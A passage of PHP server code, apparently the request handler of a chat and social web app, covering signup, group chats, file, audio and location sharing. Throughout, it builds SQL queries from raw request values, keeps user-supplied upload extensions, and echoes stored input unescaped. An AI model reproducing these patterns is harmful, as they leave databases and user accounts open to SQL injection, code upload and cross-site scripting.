<?php 
include ('../include/functions.php');
$db= new functions();
require '../phpmailer/PHPMailerAutoload.php';
$mail=new PHPMailer;
$mail->isSMTP();
//$mail->SMTPDebug = 4;
$mail->Host = Shost;
$mail->Port = 587;
$mail->SMTPAuth = true; 
$mail->SMTPSecure = 'false';
$mail->Username = Semail; // GMAIL username
$mail->Password = Spassword; // GMAIL password
$mail->SetFrom(Semail, "Hopedin");
if(isset($_REQUEST['action']) && $_REQUEST['action']=='Do_signup')
{
	$data=$db->checkemail($_REQUEST['email']);
	$data1=$db->checkmobile($_REQUEST['mobile']);
	if(mysqli_num_rows($data))
	{
		echo "0";
		die;
	}
	else if(mysqli_num_rows($data1))
	{
		echo "3";
		die;
	}
	else
	{
		$img=end(explode(".",$_FILES['file']['name'])); 
		$f_name=time().".".$img;
		$_POST['cdate']=date('Y-m-d H:i:s');
		$_POST['profile']=$f_name;
		$_POST['user_type']=$_SESSION['session_type'];
		if($_POST['user_type']=='school')
		{
			$my_rand_strng = substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), -1).rand ( 100000000000 , 999999999999 );
		}
		else 
		{
			$my_rand_strng = substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), -2).rand ( 100000000000 , 999999999999 );
		}
		
		$_POST['account_id']=$my_rand_strng;
		$ins=$db->insert_data('registration',$_POST);
		if($ins)
		{
			move_uploaded_file($_FILES['file']['tmp_name'], "../uploads/".$f_name);
			unset($_SESSION['mobileNumber']);
			unset($_SESSION['session_type']);
			echo "1";
			die;
		}
		else
		{
			echo "2";
			die;
		}
		

	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='change_subemail'){	
		$sel="select * from registration where email='".$_REQUEST['email']."' and id='".$_SESSION['session_user_set']."'";    
		$data=$db->query($sel);	
		if(mysqli_num_rows($data))	{		
		$row=mysqli_fetch_assoc($data);		
		if($row['afp_pin']==$_REQUEST['asp_pin'])		
		{			
		$sql="select * from registration where email='".$_REQUEST['new_email']."' and id!='".$_SESSION['session_user_set']."'";			
		$q=$db->query($sql);			
		if(mysqli_num_rows($q))			
		{				
		echo "3";			
		}			
		else 			{				
		$db->query("update registration set email='".$_REQUEST['new_email']."' where id='".$_SESSION['session_user_set']."'");				
		echo "1";			
		}					
		}		
		else 		
		{			echo "0";		
		}	
		}	else 	{
			echo "2";	
			}	die;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='profile_uform')
{
	if($_FILES['file']['name'])
	{
		$img=end(explode(".",$_FILES['file']['name'])); 
		$f_name=time().".".$img;
		move_uploaded_file($_FILES['file']['tmp_name'], "../uploads/".$f_name);
		$_POST['profile']=$f_name;
	}
	$q=$db->create_query($_POST);
	$sql="update registration set $q where id='".$_SESSION['session_user_set']."'";
	$db->query($sql);
	$_SESSION['succ_msg']='Success!';
	echo "<script>window.location.href='../profile-management.php'</script>";
	die;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='chat_unread_msg') 
{
	$db->query("update chat_msg set deliver=1 where chat_msg.receiver=".$_SESSION['session_user_set']);
	$all_read=$db->Get_unread_msg_all();
	echo $all_count=mysqli_num_rows($all_read); 
	echo "@";
	$data=$db->Get_my_requests(); 
	echo $count=mysqli_num_rows($data);
	die;
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='update_contact_list')
{
	?>
	<li><a href="#"><span class="menu-icon"><i class="fa fa-mobile" style="font-size:30px;"></i></span> Mobile Chat App</a> <span class="right-ico"><i class="fa fa-angle-right"></i></span></li>
					<?php $data1=$db->Get_my_friend_chat(); 
						  $count=mysqli_num_rows($data1);
						  $gp_data1=$db->Get_my_friend_groups(); 
						  $gp_count=mysqli_num_rows($gp_data1);
						  if($count)
						  {
						  while($row1=mysqli_fetch_array($data1))
						  {
							  $mdata=$db->Get_unread_msg($row1['id']);
							  $msg_count=mysqli_num_rows($mdata);
							?>
							<li data-id="<?php echo $row1['chat_id']; ?>" class="chat-selected"><a class="get_chat my_chatting<?php echo $row1['id']; ?>" data-group="0" data-id="<?php echo $row1['id']; ?>" href="javascript:void(0);"><span class="menu-icon"><img src="uploads/<?php echo $row1['profile']; ?>"></span> <?php echo explode(" ",$row1['fname'])[0]; ?> <span class="time"><?php if($row1['cdate']){ echo $db->humanTiming(strtotime($row1['cdate']))." ago"; } ?></span>  <span class="right-ico"><?php if($msg_count){ ?><span class="badge cout<?php echo $row1['id']; ?>"><?php echo $msg_count; ?></span><?php } ?> <i class="fa fa-angle-right"></i></span></a> </li>
							<?php
						  }
						  }
						 if($gp_count)
						  {
							  while($row=mysqli_fetch_array($gp_data1))
							  {
								  $se_data=$db->Get_my_friend_chat_groups($row['group_id']);
								  $row1=mysqli_fetch_assoc($se_data);
								  $ssql="select * from chat_msg where groups!='0' and group_id='".$row['group_id']."' order by chat_id DESC limit 0,1";
								  $squery=$db->query($ssql);
								  $row2=mysqli_fetch_assoc($squery);
								  $mdata=$db->Get_unread_msg($row1['id']);
								  $msg_count=mysqli_num_rows($mdata);
								?>
								<li data-id="<?php echo $row2['chat_id']; ?>" class="chat-selected"><a class="get_chat my_chatting<?php echo $row1['chat_id']; ?>" data-group="1" data-id="<?php echo $row1['chat_id']; ?>" href="javascript:void(0);"><span class="menu-icon"><img src="uploads/<?php echo $row1['file']; ?>"></span> <?php echo $row1['gp_name']; ?> <span class="time"><?php if($row2['cdate']){ echo $db->humanTiming(strtotime($row2['cdate']))." ago"; } ?></span>  <span class="right-ico"><?php if($msg_count){ ?><span class="badge cout<?php echo $row1['chat_id']; ?>"><?php echo $msg_count; ?></span><?php } ?> <i class="fa fa-angle-right"></i></span></a> </li>
								<?php
							   }
						  }
						  else if($gp_count==0 and $count==0)
						  {
							  ?>
							  <p class="alert alert-danger text-center">No Friends Yet!</p>
							  <?php
						  }
					
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='add_new_friends')
{
	$id=$_REQUEST['rid'];
	$sql="select * from chat_msg where chat_id='$id'";
	$query=$db->query($sql);
	$gp_row=mysqli_fetch_assoc($query);
	?>
			<form method="post" id="add_Gform" onsubmit="return adds_groupMember();" >
				<!-- Modal content-->
				<div class="modal-content">
				  <div class="modal-header" style="padding:0px !important; background:none;">
						<h4 class="modal-title" style="background:#35b729; padding:10px;"><b>Group Info: </b><?php echo $gp_row['gp_name']; ?></h4>
						<div class="contact-search-box" style="clear:both;">
						<input type="text" id="group_users_update" style="color: black;" placeholder="Search here">
						</div>
				  </div>
				 
				  <div class="modal-body">
				  <h4>Add Group Members:</h4>
				  <ul class="added-contact-share1">
					  <?php $data1=$db->Get_Mygroup_member_not($gp_row['receiver']);
						  $count=mysqli_num_rows($data1);
						  if($count)
						  {
							  while($row1=mysqli_fetch_array($data1))
							  {
								 
								?>
								<li style="display:inline-block; width:100%" class="chat-selected contact-share-list list_unique<?php echo $row1['id']; ?>"><a class="" data-id="<?php echo $row1['id']; ?>" href="javascript:void(0);"><span class="menu-icon"><img src="uploads/<?php echo $row1['profile']; ?>"></span><?php echo explode(" ",$row1['fname'])[0]; ?> 
								<span class="right-ico check-box-add"><input class="new_users" value="<?php echo $row1['id']; ?>" name="group_users[]" type="checkbox"></span>
								</a>
								
								</li>
								<?php
							  }
						  }
						  else 
						  {
							  ?>
							 <li><p class="alert alert-danger text-center">No Contacts Yet!</p></li>
							  <?php
						  }
						?>
							
						</ul>
				  </div> 
				  <div class="modal-footer">
				  <button type="button" onclick="return process_new_members(<?php echo $gp_row['chat_id']; ?>);" class='btn btn-success'>Add New Friends</button>
				  <button type="button" class="btn btn-default" data-dismiss="modal" style="background:#86162d; float:left; color:#fff; border:none;">Cancel</button>
				  </div>
				  
				</div>
				</form>
	<?php
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='get_chat_side')
{
	$data=$db->get_user_byId($_REQUEST['id']);
	$row=mysqli_fetch_assoc($data);
	$gp_data=$db->Get_my_friend_chat_groups($_REQUEST['id']);
	$gp_row=mysqli_fetch_assoc($gp_data);
	if($_REQUEST['group']==1){
	?>
	<div id="infos_group" style="top:10%; z-index: 99999;" class="modal fade" role="dialog">
				<div class="modal-dialog">
				<form method="post" enctype="multipart/form-data" id="create_updates" onsubmit="return updates_submit();" >
				<!-- Modal content-->
				<div class="modal-content">
				  <div class="modal-header" style="padding:0px !important; background:none;">
						<h4 class="modal-title" style="background:#35b729; padding:10px;"><b>Group Info: </b><?php echo $gp_row['gp_name']; ?></h4>
						<?php if($gp_row['sender']==$_SESSION['session_user_set']){ ?>
						<div class="col-sm-12 contact-search-box">
							<div class="col-sm-6">
								<label> Group Name
									<input type="text" value="<?php echo $gp_row['gp_name']; ?>" name="gp_name" required id="" style="color: black;" placeholder="Enter Group Name">
									<input type="hidden" value="<?php echo $gp_row['chat_id']; ?>" name="gp_id" />
								</label>
							</div>
							<div class="col-sm-6">
							<label>Change Group Icon
								<input type="file" name="file_icon" />
							</label>
							</div>
							<button type="submit" class="btn btn-default spin_btn pull-right" style="background:#35b729; color:#fff; border:none;"> <i style="display:none;" class="fa fa-spinner fa-spin fa-fw spin_loader"></i>Update Info</button>
						</div>
						
						
						<?php } ?>
						<div class="contact-search-box" style="clear:both;">
						<input type="text" id="group_users_update" style="color: black;" placeholder="Search here">
						</div>
				  </div>
				 
				  <div class="modal-body">
				  <h4>Group Members:</h4>
				  <ul class="added-contact-share1">
					  <?php $data1=$db->Get_Mygroup_member($gp_row['receiver']);
						  $count=mysqli_num_rows($data1);
						  if($count)
						  {
							  while($row1=mysqli_fetch_array($data1))
							  {
								 
								?>
								<li style="display:inline-block; width:100%" class="chat-selected contact-share-list unique<?php echo $row1['id']; ?>"><a class="pull-left" data-id="<?php echo $row1['id']; ?>" href="javascript:void(0);"><span class="menu-icon"><img src="uploads/<?php echo $row1['profile']; ?>"></span><?php echo explode(" ",$row1['fname'])[0]; ?> </a>
								<?php if($gp_row['group_admin']=='1' || ($gp_row['sender']==$_SESSION['session_user_set']) ){
								 ?>
								<a onclick="return remove_member(<?php echo $gp_row['chat_id']; ?>,<?php echo $row1['id']; ?>);" class="pull-right btn btn-danger" href="javascript:void(0);">Remove</a>
								<?php } ?>
								</li>
								<?php
							  }
						  }
						  else 
						  {
							  ?>
							 <li><p class="alert alert-danger text-center">No Contacts Yet!</p></li>
							  <?php
						  }
						?>
							
						</ul>
						<?php if($gp_row['group_admin']=='1' || ($gp_row['sender']==$_SESSION['session_user_set']) ){ ?>
						<hr>
						<button type="button" id="cost_btn" onclick="return add_new_friend(<?php echo $gp_row['chat_id']; ?>);" class='btn btn-success'>Add New Friends</button>
						<?php } ?>
				  </div> 
				  <div class="modal-footer">
				  <button type="button" class="btn btn-default" data-dismiss="modal" style="background:#86162d; float:left; color:#fff; border:none;">Cancel</button>
				  </div>
				  
				</div>
				</form>

			  </div>
			</div>
<?php } ?>
	<div id="adds_group" style="top:10%; z-index: 99999;" class="modal fade" role="dialog">
			 <div class="modal-dialog new-members">
				

			  </div>
	</div>
	<div class="main-right">
					<h4 class="chat-name"><?php if($_REQUEST['group']==1){ echo $gp_row['gp_name']; ?><a style="color:#163962;" data-toggle="modal" data-target="#infos_group" href="javascript:void(0);"><i class="fa fa-info-circle"></i></a>
					<?php } else { echo $row['fname']; ?><a style="color:#163962;" href="profile-page.php?id=<?php echo $row['id']; ?>"><i class="fa fa-user"></i></a><?php } ?> </h4>
					<div class="chat-screen">
					</div>
					<div class="fix-typer">
						<div class="chat-type-board">
						   <form method="post" id="chat_msg" onsubmit="return chat_start();" >
							<div class="typer">
								<span><a href="#"><i class="fa fa-calendar"></i></a></span>
								<span class="laod-aud"><a href="javascript:void(0);" id="start-btn" ><i class="fa fa-circle-o-notch fa-spin fa-fw loader1"  style="display:none;"></i><img src="img/mike.png"></a>
								<a href="javascript:void(0);" style="display:none;" id="stop-btn"><img src="img/mike.png"></a>
								</span>
								<span>
								
								<input type="text" id="chat_text" data-emojiable="true" style="display:none;" required name="msg" placeholder="Type your message">
								<div class="emoji-wysiwyg-editor" onblur="$('#chat_text').val($(this).html());" data-id="8e40fb82-5d4e-462a-b5b0-d7f05ded14ef" data-type="input" placeholder="Type your message" contenteditable="true" style="height: 40px;"></div>
								<input type="hidden" data-val="<?php echo $_REQUEST['group']; ?>" id="reciver_id" value="<?php if($_REQUEST['group']==1) { echo $gp_row['group_id']; } else { echo $row['id']; } ?>" required name="rid">
								<button type="submit" id="chat_submit" style="display:none;" >send</button>
								</span>
								<span style="position: relative; right: 36px;"><a href="javascript:void(0);" id="open-emoji"><i class="fa fa-smile-o"></i></a> <div id="target-emoji">
									<ul class="gets_emojis">
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/blush.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/grinning.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/grin.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/flushed.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/frowning.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/angry.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/cry.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/disappointed_relieved.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/cold_sweat.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/fearful.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/heart_eyes.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/innocent.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/joy.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/kissing_closed_eyes.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/kissing_heart.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/laughing.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/mask.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/no_mouth.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/pensive.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/persevere.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/relieved.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/satisfied.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/scream.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/sleeping.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/sleepy.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/smile.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/smiley.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/smirk.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/sob.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/stuck_out_tongue.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/stuck_out_tongue_closed_eyes.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/stuck_out_tongue_winking_eye.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/sunglasses.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/sweat.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/tired_face.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/triumph.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/weary.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/wink.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/worried.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/yum.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/baby.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/bow.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/boy.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/girl.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/cop.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/man.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/woman.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/older_man.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/older_woman.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/bust_in_silhouette.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/busts_in_silhouette.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/clap.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/fist.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/hand.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/muscle.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/ok_hand.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/open_hands.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/point_down.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/point_up.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/punch.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/raised_hands.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/thumbsdown.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/thumbsup.png"></a></li>
										
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/walking.png"></a></li>
										<li><a href="#"><img class="emoji-icon1" src="img/emojis/runner.png"></a></li>
									</ul>
								</div>
								</span>
								<span class="span-face"></span>
								<span><a onclick="$('#chat_submit').trigger('click');" href="javascript:void(0);"><i class="fa fa-arrow-circle-o-right"></i></a></span>
							</div>
						    </form>
						</div>
					
						<div class="chat-uploaders">
							
							<ul>
							<li><a href="javascript:void(0);" onclick="$('#gallery_file').trigger('click');" ><span><i  class="fa fa-folder-open"></i></span><span>Gallery</span></a>
							</li>
							<li><a href="javascript:void(0);" class="cameras camera_start" onClick="setup(); $(this).hide().next().show();"><span><i  class="fa fa-camera"></i></span><span>Camera</span></a> <a href="javascript:void(0);" class="cameras camera_stop" onClick="take_snapshot()" style="display:none"><span style="color:red;"><i  class="fa fa-camera"></i></span><span>Take Snap</span></a></li> 
							<li><a href="javascript:void(0);" onclick="$('#gallery_file').trigger('click');"><span><i  class="fa fa-print"></i></span><span>Document</span></a></li>
							<li><a href="#"><span><i class="fa fa-phone"></i></span><span>Call Audio</span></a></li>
							<li><a href="#"><span><i class="fa fa-video-camera" aria-hidden="true"></i></span><span>Call Video</span></a></li>
							<li><a href="#"><span><i  class="fa fa-gift"></i></span><span>Kick In</span></a></li>
							<li><a href="#"><span><i class="fa fa-exchange"></i></span><span>Transfer</span></a></li>
							<li><a href="#"><span><i  class="fa fa-dollar"></i></span><span>Pay Free</span></a></li>
							<li><a href="#"><span><i  class="fa fa-heart"></i></span><span>Favorite</span></a></li>
							<li><a href="javascript:void(0);" onclick="Get_geo_location();"><span><i  class="fa fa-map"></i></span><span>Location</span></a></li>
							<li><a href="javascript:void(0);" data-toggle="modal" data-target="#contact-share"><span><i  class="fa fa-address-book"></i></span><span>Contact</span></a></li>
						</ul>
						</div>
					</div>
				</div>
				
				
				<div id="contact-share" style="top:10%; z-index: 99999;" class="modal fade" role="dialog">
				  <div class="modal-dialog">

							<!-- Modal content-->
							<div class="modal-content">
							  <div class="modal-header" style="padding:0px !important; background:none;">
									<h4 class="modal-title" style="background:#35b729; padding:10px;">Share Contact</h4>
									<div class="contact-search-box">
									<input type="text" id="contactss_users" style="color: black;" placeholder="Search here">
									</div>
							  </div>
							 
							  <div class="modal-body">
							  
							  <ul class="added-contact-share">
								  <?php $data1=$db->Get_my_friends();
									  $count=mysqli_num_rows($data1);
									  if($count)
									  {
										  while($row1=mysqli_fetch_array($data1))
										  {
											 
											?>
											<li class="chat-selected contact-share-list"><a class="" data-id="<?php echo $row1['id']; ?>" href="javascript:void(0);"><span class="menu-icon"><img src="uploads/<?php echo $row1['profile']; ?>"></span><?php echo explode(" ",$row1['fname'])[0]; ?> </a><span class="right-ico check-box-add"><input class="my_selects" type="checkbox" value="<?php echo $row1['id']; ?>" name="selects[]" ></span></li>
											<?php
										  }
									  }
									  else 
									  {
										  ?>
										 <li><p class="alert alert-danger text-center">No Contacts Yet!</p></li>
										  <?php
									  }
									?>
										
									</ul>
							  </div> 
							  <div class="modal-footer">
							  <button type="button" class="btn btn-default" data-dismiss="modal" style="background:#86162d; float:left; color:#fff; border:none;">Cancel</button>
							   <button type="button" onclick="return share_all_contact();" class="btn btn-default" style="background:#35b729; color:#fff; border:none;">Share Contact</button>
							  </div>
							  
							</div>

						  </div>
				</div>
				<!-- Modal -->
					<div id="files_Modal" style="top:25%;" class="modal fade" role="dialog">
					  <div class="modal-dialog">

						<!-- Modal content-->
						<div class="modal-content">
						  <div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">&times;</button>
							<h4 class="modal-title">Upload File:</h4>
						  </div>
						  <form action="process.php" onsubmit="return file_submit();" method="post" enctype="multipart/form-data" id="upload_form">
						  <div class="modal-body">
							<div class="form-wrap">
								<input name="file" onchange="$('#gallery_submit').click();" id="gallery_file" type="file" />
								<input type="hidden" value="<?php echo $row['id']; ?>" required name="rid">
								<!--div id="progress-wrp"><div class="progress-bar"></div ><div class="status">0%</div></div>
								<div id="output" --><!-- error or success results ></div -->
							</div>
						  </div> 
						  <div class="modal-footer">
							<button type="submit" id="gallery_submit" class="btn btn-success btn_prop">Send <i class="fa fa-spinner fa-spin fa-fw btn_load" style="display:none;"></i></button>
							<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
						  </div>
						  </form>
						</div>

					  </div>
				  </div>
				
	<?php
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='share_all_contact')
{
	$q="";
	if($_REQUEST['group']!=1)
	{
		$req_data=$db->check_blocked($_REQUEST['id']);
		if(mysqli_num_rows($req_data))
		{
			echo "2";
			die;
		}
		$req_data=$db->check_blocked_other($_REQUEST['id']);
		if(mysqli_num_rows($req_data))
		{
			echo "3";
			die;
		}
	}
	else 
	{
		$q.=",groups=2,group_id='".$_REQUEST['id']."'";
	}
	//$val=implode(",",$_REQUEST['contact']);
	foreach($_REQUEST['contact'] as $val)
	{
		$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',`file`='val.png',contacts='$val',types='contact/set' $q";
		$db->query($ins);
	}
	
	echo "1";
	
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='updates_submit')
{
	$q="";
	if($_FILES['file_icon']['name'])
	{
		$imgs=end(explode(".",$_FILES['file_icon']['name']));
		$f_name=time().".".$imgs;
		$q=",file='$f_name'";
		move_uploaded_file($_FILES['file_icon']['tmp_name'],"../uploads/".$f_name);
	}
	$ins="update chat_msg set gp_name='".$_REQUEST['gp_name']."' $q where chat_id='".$_REQUEST['gp_id']."'";
	$db->query($ins);
	echo "1";
	
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='create_submit')
{
	$receiver=implode(",",$_REQUEST['group_users']);
	
	$receiver.=",".$_SESSION['session_user_set'];
	if($_FILES['file_icon']['name'])
	{
		$imgs=end(explode(".",$_FILES['file_icon']['name']));
		$f_name=time().".".$imgs;
		move_uploaded_file($_FILES['file_icon']['tmp_name'],"../uploads/".$f_name);
	}
	else 
	{
		$f_name='groups.png';
	}
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='$receiver',msg='',cdate='".date('Y-m-d H:i:s')."',`file`='$f_name',types='',groups='1',gp_name='".$_REQUEST['gp_name']."',group_admin='".$_REQUEST['addedby']."'";
	$db->query($ins);
	$ids=$db->lastid();
	$db->query("update chat_msg set group_id='$ids' where chat_id=".$ids);
	echo "1";
	
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='file_submit')
{
	$img=end(explode(".",$_FILES['file']['name']));
	$f_name=time().".".$img;
	
	$q="";
	if($_REQUEST['group']!=1) 
	{
	}
	else    
	{
		$q.=",groups=2,group_id='".$_REQUEST['id']."'";
	}
	if(move_uploaded_file($_FILES['file']['tmp_name'],'../img/chat_files/'.$f_name))
	{
		echo $_FILES['file']['type'];
		$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['rid']."',msg='',cdate='".date('Y-m-d H:i:s')."',file='".$f_name."',types='".$_FILES['file']['type']."' $q";
		$db->query($ins);  
		echo "1";
	}
	else 
	{
		echo "0"; 
	}
	die;
	
	
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='upload_camera')
{
	$q="";
	if($_REQUEST['group']!=1)
	{
		$req_data=$db->check_blocked($_REQUEST['id']);
		if(mysqli_num_rows($req_data))
		{
			echo "2";
			die;
		}
		$req_data=$db->check_blocked_other($_REQUEST['id']);
		if(mysqli_num_rows($req_data))
		{
			echo "3";
			die;
		}
	}
	else 
	{
		$q.=",groups=2,group_id='".$_REQUEST['id']."'";
	}
	$f_name=$_REQUEST['file'];
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',file='".$f_name."',types='image/mpeg' $q";
	$db->query($ins);
	echo "1";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='upload_location')
{
	$q="";
	if($_REQUEST['group']!=1)
	{
		$req_data=$db->check_blocked($_REQUEST['id']);
		if(mysqli_num_rows($req_data))
		{
			echo "2";
			die;
		}
		$req_data=$db->check_blocked_other($_REQUEST['id']);
		if(mysqli_num_rows($req_data))
		{
			echo "3";
			die;
		}
	}
	else 
	{
		$q.=",groups=2,group_id='".$_REQUEST['id']."'";
	}
	$latitude=$_REQUEST['latitude'];
	$longitude=$_REQUEST['longitude'];
	$centerPoint = $latitude.",".$longitude;
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',points='".$centerPoint."',types='location',file='maps.png' $q";
	$db->query($ins);
	echo "1";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='add_recordFile')
{
	/*$data=$_REQUEST['url'];
	//list($type, $data) = explode(';', $data);
	//list(, $data)      = explode(',', $data);
	$data = base64_decode($data);	
	$file=time()."."."wav";
	file_put_contents('../img/chat_files/'.$file, $data);
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',file='".$file."',types='audio/mpeg'";
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',file='".$_REQUEST['url']."',types='record/mpeg'";
	$db->query($ins);  */
	$req_data=$db->check_blocked($_REQUEST['rid']);
	if(mysqli_num_rows($req_data))
	{
		echo "2";
		die;
	}
	$req_data=$db->check_blocked_other($_REQUEST['rid']);
	if(mysqli_num_rows($req_data))
	{
		echo "3";
		die;
	}
	$f_name = time().".wav";
	echo $_FILES['audio_data']['name'];
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',file='".$f_name."',types='audio/mpeg'";
	$db->query($ins);
	move_uploaded_file($_FILES['audio_data']['tmp_name'],'../img/chat_files/'.$f_name);
	echo "1";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='capture_photo')
{
	$data=$_REQUEST['capture'];
	list($type, $data) = explode(';', $data);
	list(, $data)      = explode(',', $data);
	$data = base64_decode($data);	
	
	$q="";
	if($_REQUEST['group']!=1)
	{
		$req_data=$db->check_blocked($_REQUEST['rid']);
		if(mysqli_num_rows($req_data))
		{
			echo "2";
			die;
		}
		$req_data=$db->check_blocked_other($_REQUEST['rid']);
		if(mysqli_num_rows($req_data))
		{
			echo "3";
			die;
		}
	}
	else 
	{
		$q.=",groups=2,group_id='".$_REQUEST['rid']."'";
	}
	$file=time()."."."png";
	file_put_contents('../img/chat_files/'.$file, $data);
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['id']."',msg='',cdate='".date('Y-m-d H:i:s')."',file='".$file."',types='image/png' $q";
	$db->query($ins); 
	//move_uploaded_file($_FILES['audio_data']['tmp_name'],'../img/chat_files/'.$file);
	echo "1";
}


else if(isset($_REQUEST['action']) && $_REQUEST['action']=='chat_start')
{
	$q="";
	if($_REQUEST['group']!=1)
	{
		$req_data=$db->check_blocked($_REQUEST['rid']);
		if(mysqli_num_rows($req_data))
		{
			echo "2";
			die;
		}
		$req_data=$db->check_blocked_other($_REQUEST['rid']);
		if(mysqli_num_rows($req_data))
		{
			echo "3";
			die;
		}
	}
	else 
	{
		$q.=",groups=2,group_id='".$_REQUEST['rid']."'";
	}
	$ins="insert into chat_msg set sender='".$_SESSION['session_user_set']."',receiver='".$_REQUEST['rid']."',msg='".htmlentities($_REQUEST['msg'],ENT_QUOTES)."',cdate='".date('Y-m-d H:i:s')."' $q ";
	$db->query($ins);
	echo "1";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='update_notification')
{
